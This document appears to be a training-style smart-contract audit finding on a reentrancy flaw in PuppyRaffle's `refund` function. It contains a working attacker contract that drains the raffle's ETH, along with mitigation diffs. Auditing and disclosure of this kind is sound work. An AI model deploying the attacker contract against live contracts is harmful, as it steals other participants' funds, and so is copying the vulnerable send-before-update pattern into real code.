### [H-2] Reentrancy in `PuppyRaffle::refund` Allows an Attacker to Drain the Contract

**Description:** The `PuppyRaffle::refund` function sends ETH to `msg.sender` before updating the player's status in storage. Since `sendValue` forwards all available gas, a malicious contract can re-enter `refund` from its `receive` or `fallback` function before `players[playerIndex]` is set to `address(0)`.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

Because the state update happens after the external call, the attacker remains an active player during the callback and can repeatedly request refunds using the same `playerIndex`.

**Impact:** A malicious entrant can drain the raffle contract balance by paying the entrance fee once and recursively calling `refund` until the contract no longer has enough ETH to continue refunding.

This can steal funds belonging to other raffle participants and prevent the raffle from operating correctly.

**Proof of Concept:**

The PoC in `cyfrin/4-puppy-raffle-audit/test/PuppyRaffleTest.t.sol` deploys an attacker contract, enters the raffle once, calls `refund`, and then re-enters `refund` from both `receive` and `fallback`.

<details>
<summary>Code</summary>

```js
function testRefund_ReentrancyAttack() public {
    address[] memory players = new address[](4);
    players[0] = address(1);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    Refund_ReentrancyAttack attacker = new Refund_ReentrancyAttack(puppyRaffle);
    address attackerAddress = makeAddr("attacker");
    vm.deal(attackerAddress, entranceFee * 2);
    vm.prank(attackerAddress);

    uint256 startingcontractBalance = address(puppyRaffle).balance;
    uint256 startingAttackerBalance = address(attacker).balance;

    attacker.attack{value: entranceFee}();

    console.log("starting contract balance:", startingcontractBalance);
    console.log("starting attacker balance:", startingAttackerBalance);
    console.log("ending contract balance:", address(puppyRaffle).balance);
    console.log("ending attacker balance:", address(attacker).balance);
}

contract Refund_ReentrancyAttack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function steal() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        steal();
    }

    fallback() external payable {
        steal();
    }
}
```

</details>

**Recommended Mitigation:**
1. Follow the Checks-Effects-Interactions pattern by updating the player's status before making the external call.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-   payable(msg.sender).sendValue(entranceFee);
-
    players[playerIndex] = address(0);
+   payable(msg.sender).sendValue(entranceFee);
    emit RaffleRefunded(playerAddress);
}
```

2. Alternatively, add a boolean reentrancy lock that is set at the beginning of `refund` and cleared at the end, ensuring the function cannot be called recursively.

```diff
+ bool private locked;
+
function refund(uint256 playerIndex) public {
+   require(!locked, "PuppyRaffle: Reentrant call");
+   locked = true;
+
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
+
+   locked = false;
}
```
